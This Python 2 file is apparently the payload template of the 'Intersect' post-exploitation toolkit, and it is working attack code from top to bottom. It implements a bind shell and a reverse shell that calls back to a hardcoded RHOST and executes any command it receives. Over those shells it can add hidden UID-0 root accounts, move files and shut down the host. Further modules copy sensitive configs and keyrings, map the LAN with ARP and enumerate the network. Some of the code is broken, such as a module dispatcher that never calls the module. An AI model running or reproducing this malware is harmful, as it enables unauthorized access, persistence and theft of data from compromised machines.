#!/usr/bin/python
# intersect 2.0 | created by ohdae
# copyright 2012
# payload_template to be used with Create.py

import sys, os, re, signal
from subprocess import Popen,PIPE,STDOUT,call
import platform
import shutil
import getopt
import tarfile
import socket
import urllib2
import random, string
import logging
import struct
import getpass
import pwd
import thread
import base64
import operator
import SocketServer, SimpleHTTPServer

cut = lambda s: str(s).split("\0",1)[0]
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
    from scapy.all import *
except ImportError:
    try:
        from scapy import *
    except ImportError:
        print("Scapy is not installed. It can be downloaded here => https://www.secdev.org/projects/scapy/\n")

def environment():
    global Home_Dir
    global Temp_Dir
    global Config_Dir
    global User_Ip_Address
    global UTMP_STRUCT_SIZE    
    global LASTLOG_STRUCT_SIZE
    global UTMP_FILEPATH      
    global WTMP_FILEPATH       
    global LASTLOG_FILEPATH
    global distro
    global distro2

    ## Global variables for remote shells are defined during the creation process
    ## Variables for Scrub module. Do not change unless you know what you're doing. 
    UTMP_STRUCT_SIZE    = 384
    LASTLOG_STRUCT_SIZE = 292
    UTMP_FILEPATH       = "/var/run/utmp"
    WTMP_FILEPATH       = "/var/log/wtmp"
    LASTLOG_FILEPATH    = "/var/log/lastlog"

    distro = os.uname()[1]
    distro2 = platform.linux_distribution()[0]
 
    Home_Dir = os.environ['HOME']
    User_Ip_Address = socket.gethostbyname(socket.gethostname())
    
    Rand_Dir = ''.join(random.choice(string.letters) for i in xrange(12))
    Temp_Dir = "/tmp/lift-"+"%s" % Rand_Dir
    Config_Dir = Temp_Dir+"/configs/"

    if os.geteuid() != 0:
        print("[*] Intersect should be executed as a root user. If you are not root, Intersect can check for privilege escalation vulnerabilites.")
        print("[*] Enter '1' to check for possible vulnerabilities (privesc module must be loaded). Enter '99' to exit without checking.")
	option = raw_input("=> " )
        if option == '1':
            privesc()
            sys.exit()
        else:
            sys.exit()
    else:
         pass

    signal.signal(signal.SIGINT, signalHandler)

    os.system("clear")
    print("[+] Creating temporary working environment....")

    os.chdir(Home_Dir)

    if os.path.exists(Temp_Dir) is True:
        os.system("rm -rf "+Temp_Dir)

    if os.path.exists(Temp_Dir) is False:
        os.mkdir(Temp_Dir)

    print "[!] Reports will be saved in: %s" % Temp_Dir

  
def signalHandler(signal, frame):
    print("[!] Ctrl-C caught, shutting down now");
    Shutdown()

  
def Shutdown():
    if not os.listdir(Temp_Dir):
        os.rmdir(Temp_Dir)

def whereis(program):
    for path in os.environ.get('PATH', '').split(':'):
       if os.path.exists(os.path.join(path, program)) and \
            not os.path.isdir(os.path.join(path, program)):
                return os.path.join(path, program)
    return None


def globalvars():
    global PORT
    global RHOST
    global RPORT
    global PPORT
    global PKEY
    global modList

    modList = ['bshell', 'daemon', 'extras', 'lanmap', 'network', 'rshell']
    PORT = 4444
    RHOST = '192.168.1.4'
    RPORT = 8888
    PPORT = 8080
    PKEY = 'KFISUXXF'


# Starts a TCP bind shell on the remote system. Offers you the ability to run Intersect tasks via the remote shell.
def bshell():
    HOST = ''
    socksize = 4096
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
    try:
        server.bind((HOST, PORT))
        server.listen(10)
        conn, addr = server.accept()
        conn.send("\nIntersect "+str(os.getcwd())+" => ")
    except:
        print "[!] Connection closed."
    	sys.exit(2)
    
    while True:
        cmd = conn.recv(socksize)
        proc = Popen(cmd,
             shell=True,
             stdout=PIPE,
             stderr=PIPE,
             stdin=PIPE,
             )
        stdout, stderr = proc.communicate()

        if cmd.startswith('cd'):
	    destination = cmd[3:].replace('\n','')
            if os.path.isdir(destination):
	        os.chdir(destination)
	        conn.send("\nIntersect "+str(os.getcwd())+" => ")
            else:
	        conn.send("[!] Directory does not exist") 
	        conn.send("\nIntersect "+str(os.getcwd())+" => ")

        elif cmd.startswith('adduser'):
            strip = cmd.split(" ")
            acct = strip[1]
            os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
            conn.send("[+] Root account " + acct + " has been created.") 

        elif cmd.startswith('upload'):
            getname = cmd.split(" ")
            rem_file = getname[1]
            filename = rem_file.replace("/","_")
            filedata = conn.recv(socksize)
            newfile = file(filename, "wb")
            newfile.write(filedata)
            newfile.close()
            if os.path.isfile(filename):
                conn.send("[+] File upload complete!")
            if not os.path.isfile(filename):
                conn.send("[!] File upload failed! Please try again")

        elif cmd.startswith('download'):
            getname = cmd.split(" ")
            loc_file = getname[1]
            if os.path.exists(loc_file) is True:
                sendfile = open(loc_file, "r")
                filedata = sendfile.read()
                sendfile.close()
                conn.sendall(filedata)
            else:
                conn.send("[+] File not found!")

        elif cmd.startswith("rebootsys"):
            conn.send("[!] Server system is going down for a reboot!")
            os.system("shutdown -h now")

	elif cmd == ("extask"):
            conn.send(str(modList))
	    conn.send("\nIntersect "+str(os.getcwd())+" => ")

	elif cmd.startswith("extask"):
            getname = cmd.split(" ")
            modname = getname[1]
            if modname in modList is False:
                conn.send("[!] Module not loaded!")
            else:
		conn.send("[+] Executing %s " % modname)
                execmod = modname+"()"
                execmod

        elif cmd == ('killme'):
            conn.send("[!] Shutting down shell!\n")
            conn.close()
            sys.exit(0)

        elif proc:
            conn.sendall( stdout )
            conn.send("\nIntersect "+str(os.getcwd())+" => ")


# The daemon function lets you run any or all Intersect tasks as a background process. You are provided with the PID number to monitor or kill the task if needed.
def daemon(stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
    try: 
        pid = os.fork() 
        if pid > 0:
            sys.exit(0) 
    except OSError, e: 
        print >>sys.stderr, "fork one failed: %d (%s)" % (e.errno, e.strerror) 
        sys.exit(1)

    os.chdir("/") 
    os.setsid() 
    os.umask(0) 

    try: 
        pid = os.fork() 
        if pid > 0:
            print "[+] Daemon PID %d" % pid 
            sys.exit(0) 
    except OSError, e: 
        print("[!] Intersect will now run in the background. Check %s for your reports." % Temp_Dir)
        print >>sys.stderr, "fork #2 failed: %d (%s)" % (e.errno, e.strerror) 
        sys.exit(1) 

    si = file(stdin, 'r')
    so = file(stdout, 'a+')
    se = file(stderr, 'a+', 0)
    os.dup2(si.fileno(), sys.stdin.fileno())
    os.dup2(so.fileno(), sys.stdout.fileno())
    os.dup2(se.fileno(), sys.stderr.fileno())
    


# Search for commonly installed security measures and applications, gathers important configuration files for apps and services, tries to find source code repos.    
def extras():
    os.mkdir(Temp_Dir+"/extras")
    protectiondir = (Temp_Dir+"/extras")
    os.chdir(protectiondir)
    os.mkdir(Config_Dir)


    configs = [ "/etc/snort/snort.conf", "/etc/apache2/apache2.conf", "/etc/apache2/ports.conf",
                "/etc/bitlbee/bitlbee.conf", "/etc/mysql/my.cnf", "/etc/ufw/ufw.conf", "/etc/ufw/sysctl.conf",
                "/etc/security/access.conf", "/etc/security/sepermit.conf", "/etc/ca-certificates.conf", "/etc/apt/secring.gpg",
                "/etc/apt/trusted.gpg", "/etc/nginx/nginx.conf", "/etc/shells", "/etc/gated.conf", "/etc/inetd.conf", "/etc/rpc",
                "/etc/psad/psad.conf", "/etc/mysql/debian.cnf", "/etc/chkrootkit.conf", "/etc/logrotate.conf", "/etc/rkhunter.conf"
                "/etc/samba/smb.conf", "/etc/ldap/ldap.conf", "/etc/openldap/ldap.conf", "/opt/lampp/etc/httpd.conf", "/etc/cups/cups.conf",
                "/etc/exports", "/etc/fstab", "~/.msf4/history", "/etc/ssl/openssl.cnf" ]


    for x in configs:
        if os.path.exists(x) is True:
            shutil.copy2(x, Temp_Dir+"/configs/")

    print("[+] Searching for protection and misc extras....")
    program = [ "truecrypt", "bulldog", "ufw", "iptables", "logrotate", "logwatch", 
                "chkrootkit", "clamav", "snort", "tiger", "firestarter", "avast", "lynis",
                "rkhunter", "perl", "tcpdump", "nc", "webmin", "python", "gcc", "jailkit", 
                "pwgen", "proxychains", "bastille", "wireshark", "nagios", "nmap", "firefox",
                "nagios", "tor", "openvpn", "virtualbox", "magictree", "apparmor", "git",
                "xen", "svn", "redmine", "ldap", "msfconsole" ]

    for x in program:
        location = whereis(x)
        if location is not None:
            file = open("FullList.txt","a")
            content = location + '\n'
            file.write(content)
            file.close()

               
    if os.path.exists("~/.msf4/") is True:
        os.system("ls -l ~/.msf/loot > MetasploitLoot.txt")

# Enumerates live hosts running on the internal network. Captures internal and external IP address. Perform LAN network mapping.
def lanmap():
    # Combine ARP then portscan. Send IPs to list and iterate through for the scan
    # Add service identification via socket for all open ports
    # Add traceroute after finding live hosts. Send all results to graph report.
   
    print("[+] Searching for live hosts...")
    os.mkdir(Temp_Dir+"/hosts")
    os.chdir(Temp_Dir+"/hosts")

    try:
        #TODO:Consider scanning all non-loopback addresses for multi-homed machines
        localIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]
    except OSError:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("google.com",80))
        localIP = (s.getsockname()[0])
        s.close()
    else:
        pass
    #Get the integer representation of the local IP address
    ipBin = reduce(lambda x, y: (int(x) << 8)+int(y), localIP.split('.'))
    #route = [ network_addr, netmask, gateway, interface, address ]
    for route in scapy.all.conf.route.routes:
        if (route[4] == localIP #If it's the address we're talking to
            and route[0] != 0 #and it's not the route to the gateway itself
            and route[0] == (route[1] & ipBin)): #And localIP is in this subnet (fixes 169.254/16 oddness)
                #Calculate the CIDR from the base-2 logarithm of the netmask
                IPRange = '/'.join((localIP, str(int(32-log(0xffffffff-route[1]+1,2)))))
    
    conf.verb=0
    ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IPRange),timeout=2)
    file = open("livehosts.txt", "a")
    file.write("LAN IP Range: " + IPRange +"\n")
    for snd,rcv in ans:
        mac_address=rcv.sprintf("%Ether.src%")
        ip_address=rcv.sprintf("%ARP.psrc%")
        #print rcv.sprintf("\n\n[+] Live Host\nMAC %Ether.src%\nIP: %ARP.psrc%\n ")
        file.write("\n[+] Live Host\nIP: "+ip_address + " MAC"+ mac_address + "\n")
    file.write("\n")
    file.close

    externalIP = ip = urllib2.urlopen("http://myip.ozymo.com/").read()
    file = open("external.txt", "a")
    file.write("External IP Address: " + externalIP +"\n")
    file.write("Internal IP Address: " + localIP +"\n")
    file.write("Internal IP Range: " + IPRange +"\n")
    file.close
    
 

# Finds and saves network information such as listening ports, firewall rules, DNS configurations, network interfaces and active connections.
def network():
    print("[+] Collecting network info: services, ports, active connections, dns, gateways, etc...")
    os.mkdir(Temp_Dir+"/network")
    networkdir = (Temp_Dir+"/network")
    os.chdir(networkdir) 

    proc = Popen('netstat --tcp --listening',
         shell=True,
         stdout=PIPE,
         )
    output = proc.communicate()[0]

    file = open("nstat.txt","a")
    for items in output:
        file.write(items),
    file.close() 

    os.system("lsof -nPi > lsof.txt")
    ports = ["nstat.txt","lsof.txt"]
    content = ''
    for f in ports:
        content = content + '\n' + open(f).read()
    open('Connections.txt','wb').write(content)
    os.system("rm nstat.txt lsof.txt")
    if whereis('iptables') is not None:
        os.system("iptables -L -n > iptablesLN.txt") 
        os.system("iptables-save > iptables_save.txt")
    else:
        pass

    os.system("ifconfig -a > ifconfig.txt")


    if distro == "ubuntu" or distro2 == "Ubuntu" is True:
        os.system("hostname -I > IPAddresses.txt")
    else:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("google.com",80))
        localIP = (s.getsockname()[0])
        s.close()
        splitIP = localIP.split('.')
        splitIP[3:] = (['0/24'])
        IPRange = ".".join(splitIP)
        externalIP = ip = urllib2.urlopen("http://myip.ozymo.com/").read()
        file = open("IPAddresses.txt", "a")
        file.write("External IP Address: " + externalIP)
        file.write("Internal IP Address: " + localIP)
        file.write("Internal IP Range: " + IPRange)
        file.close
   
    os.system("hostname -f > hostname.txt")
   
    netfiles = ["IPAddresses.txt","hostname.txt","ifconfig.txt"]
    content = ''
    for f in netfiles:
        content = content + '\n' + open(f).read()
    open('NetworkInfo.txt','wb').write(content)
    os.system("rm IPAddresses.txt hostname.txt ifconfig.txt")

    network = [ "/etc/hosts.deny", "/etc/hosts.allow", "/etc/inetd.conf", "/etc/host.conf", "/etc/resolv.conf" ]
    for x in network:
        if os.path.exists(x) is True:
            shutil.copy2(x, networkdir)
   


# Start a reverse TCP shell from the remote host back to your local system. Specify your local IP as the RHOST variable in the payload_template file.
def rshell():
    socksize = 4096
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        conn.connect((RHOST, RPORT))
        conn.send("[+] New connection established!")
        conn.send("\nIntersect "+str(os.getcwd())+" => ")
    except:
        print("[!] Connection error!")
        sys.exit(2)

    while True:
        cmd = conn.recv(socksize)
        proc = Popen(cmd,
             shell=True,
             stdout=PIPE,
             stderr=PIPE,
             stdin=PIPE,
             )
        stdout, stderr = proc.communicate()
        if cmd.startswith('cd'):
	    destination = cmd[3:].replace('\n','')
            if os.path.isdir(destination):
	        os.chdir(destination)
	        conn.send("\nIntersect "+str(os.getcwd())+" => ")
            else:
	        conn.send("[!] Directory does not exist") 
	        conn.send("\nIntersect "+str(os.getcwd())+" => ")

        elif cmd.startswith('adduser'):
            strip = cmd.split(" ")
            acct = strip[1]
            os.system("/usr/sbin/useradd -M -o -s /bin/bash -u 0 -l " + acct)
            conn.send("[+] Root account " + acct + " has been created.")

        elif cmd == ("httproxy"):
	    httpd = SocketServer.ForkingTCPServer(('', PPORT), Proxy)
            conn.send("[+] Serving HTTP proxy on port %s" % PPORT)
	    httpd.serve_forever()  

        elif cmd.startswith('upload'):
            getname = cmd.split(" ")
            rem_file = getname[1]
            filename = rem_file.replace("/","_")
            filedata = conn.recv(socksize)
            newfile = file(filename, "wb")
            newfile.write(filedata)
            newfile.close()
            if os.path.isfile(filename):
                conn.send("[+] File upload complete!")
            if not os.path.isfile(filename):
                conn.send("[!] File upload failed! Please try again")

        elif cmd.startswith('download'):
            getname = cmd.split(" ")
            loc_file = getname[1]
            if os.path.exists(loc_file) is True:
                sendfile = open(loc_file, "r")
                filedata = sendfile.read()
                sendfile.close()
                conn.sendall(filedata)
            else:
                conn.send("[+] File not found!")

        elif cmd.startswith("rebootsys"):
            conn.send("[!] Server system is going down for a reboot!")
            os.system("shutdown -h now")

	elif cmd == ("extask"):
            conn.send(str(modList))
	    conn.send("\nIntersect "+str(os.getcwd())+" => ")

	elif cmd.startswith("extask"):
            getname = cmd.split(" ")
            modname = getname[1]
            if modname in modList is False:
                conn.send("[!] Module not loaded!")
            else:
		conn.send("[+] Executing %s " % modname)
                execmod = modname+"()"
                execmod

        elif cmd == ('killme'):
            conn.send("[!] Shutting down shell!\n")
            conn.close()
            sys.exit(0)

        elif proc:
            conn.sendall( stdout )
            conn.send("\nIntersect "+str(os.getcwd())+" => ")





def usage():
    print('============================================')
    print('   intersect 2.5 | custom version     ')
    print('      http://bindshell.it.cx | ohdae')
    print(' Modules:')
    print('     -b   --bshell')
    print('     -d   --daemon')
    print('     -e   --extras')
    print('     -l   --lanmap')
    print('     -n   --network')
    print('     -r   --rshell')

def main(argv):
    try:
        opts, args = getopt.getopt(sys.argv[1:], 'bdelnr', ['bshell', 'daemon', 'extras', 'lanmap', 'network', 'rshell', 'help'])
    except getopt.GetoptError, err:
        print str(err)
        Shutdown()
    for o, a in opts:
        if o in ('-h', '--help'):
            usage()
            Shutdown()
            sys.exit(2)
        elif o in ('-b', '--bshell'):
            bshell()
        elif o in ('-d', '--daemon'):
            daemon()
        elif o in ('-e', '--extras'):
            extras()
        elif o in ('-l', '--lanmap'):
            lanmap()
        elif o in ('-n', '--network'):
            network()
        elif o in ('-r', '--rshell'):
            rshell()
        else:
            assert False, 'unhandled option'
    Shutdown()


globalvars()
environment()
if __name__ == "__main__":
    if len(sys.argv) <=1:
        usage()
    main(sys.argv[1:])